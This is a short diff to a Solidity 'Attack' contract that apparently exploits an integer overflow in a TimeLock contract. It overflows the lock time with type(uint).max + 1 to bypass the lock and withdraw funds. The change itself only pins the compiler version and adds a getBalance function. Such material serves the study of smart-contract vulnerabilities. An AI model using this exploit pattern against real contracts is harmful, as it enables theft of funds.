@@ -1,7 +1,8 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8;
+pragma solidity ^0.8.17;
 
 import {TimeLock} from "./overflow.sol";
+
 contract Attack {
     TimeLock timeLock;
 
@@ -24,5 +25,9 @@ contract Attack {
             type(uint).max + 1 - timeLock.lockTime(address(this))
         );
         timeLock.withdraw();
+    }
+
+        function getBalance() public view  returns(uint){
+            return timeLock.getBalance();
     }
 }
